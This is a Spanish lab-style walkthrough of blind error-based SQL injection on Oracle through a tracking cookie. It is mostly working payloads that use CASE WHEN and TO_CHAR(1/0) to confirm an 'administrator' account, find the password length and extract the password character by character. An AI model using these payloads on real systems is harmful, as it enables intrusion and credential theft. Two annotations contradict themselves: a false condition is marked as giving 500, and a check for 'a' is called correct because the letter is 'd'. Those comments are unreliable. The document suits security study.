La vulnerabilidad se encuentra en una cookie de seguimiento (**TrackingId**). La aplicación no muestra directamente los resultados de la consulta, pero sí muestra una respuesta distinta si se provoca un error en la ejecución de la consulta SQL.

Aprovechamos esto para:

- Confirmar que la consulta es vulnerable a inyección.
- Verificar que existe una tabla ‘**users**‘ y un usuario ‘**administrator**‘.
- Descubrir la longitud de la contraseña del administrador.
- Extraer la contraseña carácter por carácter, forzando errores solo cuando la condición evaluada es verdadera.

Para provocar errores intencionados, se usa la función ‘**TO_CHAR(1/0)**‘ (división por cero en Oracle), dentro de expresiones **‘CASE WHEN**‘ que evalúan condiciones booleanas. La idea es generar un error solo cuando la condición se cumple, lo que permite inferir información sin necesidad de ver los resultados directamente.

**Quédate con esto**: Aunque la aplicación no devuelva datos visibles ni mensajes directos, es posible extraer información sensible provocando errores intencionados y observando cómo responde el sistema. Este tipo de ataque es potente y silencioso.

----------

La cookie de session "TrackingId"  es vulnerable a SQLI

* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' order by 2-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' order by 1-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' union select NULL-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' union select NULL from dual-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr''
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select 'a' from dual)||' (True)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select 'a' from dua)||' (False)

* Entramos al case when (1=1)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when(1=1) then to_char(1/0) else '' end from dual)||' (500)
* Entramos al Else
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when(2=1) then to_char(1/0) else '' end from dual)||' (500)
* El codigo de estado 500 quiere decir que la condicion se cumple:
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'
* Esto seria no valido con el status code 200 OK:
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when(1=1) then to_char(1/0) else '' end from users where username='test')||'

Para sacar la longitud de la contraseña:
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when length(password)=21 then to_char(1/0) else '' end from users where username='administrator')||'          (no cumple la condición y dará 200 OK)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when length(password)=20 then to_char(1/0) else '' end from users where username='administrator')||'          (SI cumple la condición y dará 500 Internal Server Error)

Para obtener la contraseña del usuario admin, usarmos "substr"
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when substr(username,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'     (es correcto porque el usuario admin empieza con 'a')
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when substr(username,2,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'     (es correcto porque el usuario admin tiene en la segunda posicion la letra 'd')

Ahora nos podemos aprovechar del codigo de estado para saber cuando un caracter es correcto para obtener la contraseña del usuario administrador
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
* 
